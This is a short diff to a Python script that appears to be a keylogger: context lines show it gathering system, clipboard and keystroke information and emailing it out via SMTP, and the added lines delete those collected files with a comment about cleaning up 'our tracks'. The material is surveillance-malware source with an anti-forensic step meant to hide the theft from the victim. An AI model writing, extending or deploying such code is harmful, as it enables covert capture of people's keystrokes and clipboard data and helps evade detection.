@@ -5,6 +5,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import os
 import smtplib
 #comp info
 import socket
@@ -134,3 +135,8 @@ def copy_clipboard():
 
 copy_clipboard()
 send_email(clipboard_information, file_path + extend + clipboard_information,toaddr)
+
+# Delete files - clean up our tracks
+delete_files = [system_information, clipboard_information, keys_information]
+for file in delete_files:
+    os.remove(file_path + extend + file)
